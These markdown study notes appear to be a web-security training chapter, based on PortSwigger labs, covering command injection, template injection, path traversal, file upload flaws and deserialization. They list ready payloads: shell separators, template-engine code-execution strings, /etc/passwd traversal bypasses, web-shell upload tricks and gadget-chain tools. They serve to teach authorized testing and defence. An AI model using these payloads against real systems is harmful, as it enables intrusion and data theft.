# Ch13: Command Injection, SSTI, Path Traversal, File Upload & Deserialization

Sources: `/web-security/os-command-injection`, `/web-security/server-side-template-injection`, `/web-security/file-path-traversal`, `/web-security/file-upload`, `/web-security/deserialization`. The "input reaches the OS/filesystem/object-parser" cluster — detection by output, timing, or OOB.

## OS command injection

- **Entry**: params reaching shell calls — ping/stock-check utilities, filenames, `User-Agent`/`Referer` logged by shell scripts. Separators: `;`, `|`, `&`, `&&`, `||`, `` `cmd` ``, `$(cmd)`, newline `%0a`.
- **Detection**: `;id`/`& whoami` output in response; when blind — `sleep 5`-class delays (`& sleep 10 &` → measure delta), redirect output into a served path (`> /var/www/static/out.txt` then GET it), or OOB (`nslookup COLLAB` / `curl` to your listener — DNS often survives egress filtering).
- **Confirmation discipline**: one minimal command proves execution (`id`, `whoami`, `hostname`); do not run enumerating commands beyond the minimal PoC.

## Server-side template injection

**Detect → Identify → Exploit** loop:

- **Detect**: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` — math evaluated = SSTI. Note the error when syntax is wrong: template-engine error text fingerprints the engine.
- **Identify**: engine decision tree — Twig `{{7*'7'}}`→`49`, Jinja2 `{{7*'7'}}`→`7777777`, FreeMarker `${7*7}`, Velocity `#set`/`$class`, Thymeleaf `[[${}]]`/`${T()}`, Smarty `{php}`, Mako `${}` with Python, Handlebars (limited — prototype-pollution gadgets), Pug/Jade `#{root.process}`.
- **Exploit per engine**: Jinja2 `{{config}}`/`{{''.__class__.__mro__[1].__subclasses__()}}` walk to `subprocess.Popen`; Twig `{{_self.env.registerUndefinedFilterCallback("system")}}`/`{{['id']|filter('system')}}`; FreeMarker `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`; Java EL `${T(java.lang.Runtime).getRuntime().exec('id')}`. Goal: minimal RCE proof; see `payloads-all-the-things` for full engine payloads.
- **Where**: template-controlled fields (emails, PDFs, CMS pages), error pages reflecting input in templates, user-editable templates/themes.

## Path traversal

- **Core**: `?file=../../../etc/passwd` style on filename params, image loaders, download/export endpoints, static file handlers.
- **Obstacle bypasses**: absolute path when traversal is stripped (`/etc/passwd` directly); non-recursive strip (`....//`→`../` after one pass); encoding (`%2e%2e%2f`, `%252e` double, `..%c0%af`, unicode); start-of-path validation (`/var/www/images/../../../etc/passwd`); extension whitelist (`../../../etc/passwd%00.png` null-byte on older stacks); `..\\` on Windows.
- **Read-only proof**: `/etc/passwd` or `win.ini` — enough to prove arbitrary read.

## File upload vulnerabilities

- **Unrestricted upload → web shell**: upload `shell.php`-equivalent for the stack, request it, run `id`. Two-flavor PHP shell pattern transfers across stacks.
- **Flawed validation**: `Content-Type` check only → send `image/png` header with `.php` body; filename blacklist → extension tricks (`.phtml`, `.php5`, `.phar`, case `.PhP`, `shell.php.jpg`, `shell.php.` trailing dot, `%00`/`;` separators, double extension with parser quirks).
- **Config override**: upload `.htaccess`/`web.config`/`user.ini` mapping an innocent extension to code execution (`AddType application/x-httpd-php .xyz`) — then upload `shell.xyz`.
- **Content validation bypass**: polyglot files (valid image + appended PHP), metadata-level checks fooled by real magic bytes, EXIF/JS comments carrying payloads.
- **Parser exploitation**: crafted files that crash/exploit the image lib (ImageTragick-class), XXE via `.docx`/`.svg`, XSS via HTML/SVG upload served same-origin.
- **Race conditions**: file validated then moved — race the window between upload and AV-move (`ch15` race techniques; URL-based fetch uploads have their own TOCTOU).
- **PUT uploads**: if `PUT /shell.php` is enabled on the web root, skip the form entirely.
- **No-RCE impact fallback**: stored XSS via SVG/HTML, XXE, path-traversal overwrite (filename `../`), DoS (decompression bombs, pixel floods).

## Insecure deserialization

Serialized objects passed to the app (cookies, tokens, form fields, API bodies) get re-instantiated server-side; tampering alters object state or triggers code on deserialize.

- **Recognition signatures**: PHP `O:4:"User":2:{s:4:"name";s:6:"carlos";...}`, Java `rO0`/`AC ED` (base64/raw magic), .NET `AAEAAAD`/`$type` fields, Python pickle `gASV`/`cos\nsystem`, Ruby `BAhb` — decode suspicious blobs, look for structure.
- **Attribute tampering (white-box-free start)**: modify a value, reserialize, send — `admin` flag, user id, price fields. Easiest win.
- **Magic-method/gadget chains**: dangerous `__destruct`/`__wakeup`/readResolve`-style methods reachable on deserialize; chain existing class methods to RCE. Don't hand-roll — use **PHPGGC** (PHP), **ysoserial/ysoserial.net** (Java/.NET) to generate chains for the fingerprinted stack.
- **Blind deserialization**: no error/output → OOB gadget (DNS/HTTP callback in the chain) or time-based.
- **Data-only attacks**: even without RCE, signing/encryption mistakes let you swap in a forged object (e.g., PHP object injection to arbitrary file write via `__destruct` writing files).
- **Java/.NET specifics**: .NET formatter gadgets (`TypeNameHandling`/`$type` abuse in JSON.NET), Java `readObject` chains — see `payloads-all-the-things` for chain libraries.
- **Prevention note**: never deserialize untrusted data; use data-only formats (JSON without type info), integrity-sign tokens, isolate deserialization.

## Lab reference

`https://portswigger.net/web-security/all-labs#os-command-injection` · `#server-side-template-injection` · `#path-traversal` · `#file-upload-vulnerabilities` · `#insecure-deserialization`
